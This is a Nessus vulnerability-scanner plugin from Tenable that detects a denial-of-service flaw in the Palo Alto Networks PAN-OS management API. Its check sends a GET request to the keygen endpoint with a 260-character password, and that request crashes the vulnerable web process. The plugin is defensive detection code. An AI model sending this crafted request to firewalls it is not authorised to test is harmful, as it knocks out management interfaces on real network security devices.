#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(91958);
  script_version("$Revision: 1.2 $");
  script_cvs_date("$Date: 2016/07/08 14:36:37 $");

  script_osvdb_id(140604);
  script_xref(name:"TRA", value:"TRA-2016-19");

  script_name(english:"Palo Alto Networks PAN-OS Management Interface API Remote DoS (PAN-SA-2016-0008)");
  script_summary(english:"Checks the response from management interface API.");

  script_set_attribute(attribute:"synopsis", value:
"The remote host is affected by a denial of service vulnerability.");
  script_set_attribute(attribute:"description", value:
"The Palo Alto Networks PAN-OS running on the remote host is affected
by a denial of service vulnerability in the API hosted on the
management interface, specifically in the panUserLogin() function
within panmodule.so, due to improper validation of user-supplied input
to the 'username' and 'password' parameters. An unauthenticated,
remote attacker can exploit this, via a crafted request, to cause the
process to terminate.

Note that PAN-OS is reportedly affected by other vulnerabilities as
well; however, Nessus has not tested for these.");
  script_set_attribute(attribute:"see_also", value:"https://securityadvisories.paloaltonetworks.com/Home/Detail/41");
  script_set_attribute(attribute:"solution", value:
"Upgrade to Palo Alto Networks PAN-OS version 7.0.8 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2016/06/27");
  script_set_attribute(attribute:"patch_publication_date", value:"2016/06/27");
  script_set_attribute(attribute:"plugin_publication_date", value:"2016/07/06");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/o:paloaltonetworks:pan-os");
  script_end_attributes();

  script_category(ACT_DENIAL);
  script_family(english:"Denial of Service");

  script_copyright(english:"This script is Copyright (C) 2016 Tenable Network Security, Inc.");

  script_dependencies("palo_alto_webui_detect.nbin");
  script_require_keys("www/palo_alto_panos");
  script_require_ports("Services/www", 443);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

# Make sure PAN-OS is detected
get_kb_item_or_exit("www/palo_alto_panos");

port = get_http_port(default:443, embedded:TRUE);

# Skip non-https port
if(get_port_transport(port) == ENCAPS_IP)
{
  exit(0, "Skip testing non-https port " + port + ".");  
}

# Some versions use 128 bytes for the password buffer, and some 
# newer versions use 256 bytes.
url = "/api?type=keygen&user=nessus&password=" + crap(data:"A", length:260);
res = http_send_recv3(
  method:"GET",
  item:url,
  port:port,
  exit_on_fail:TRUE
);
req = http_last_sent_request();

# Not vulnerable
if(res[0] =~ "^HTTP/[0-9.]+ 200") 
{
  if(res[2])
  {
    # Password was truncated and credentials were checked but found not valid
    if("Invalid credentials" >< res[2]) 
      audit(AUDIT_LISTEN_NOT_VULN, "web server", port);
    else
      audit(AUDIT_RESP_BAD, port, 'a keygen request. Unexpected response body:\n' + res[2]);
  }
  else
  {
    audit(AUDIT_RESP_BAD, port, 'a keygen request: no response body');
  }
}
# Vulnerable
# web server for the management interface was killed and will be
# restarted by its parent process in a few seconds.
else if(res[0] =~ "^HTTP/[0-9.]+ 502") 
{
  security_report_v4(
    port       : port,
    severity   : SECURITY_WARNING,
    request    : make_list(req),
    generic    : TRUE
  );
}
# Unexpected response status
else
{
  audit(AUDIT_RESP_BAD, port, 'a keygen request. Unexpected response status:\n' + res[0]);
}

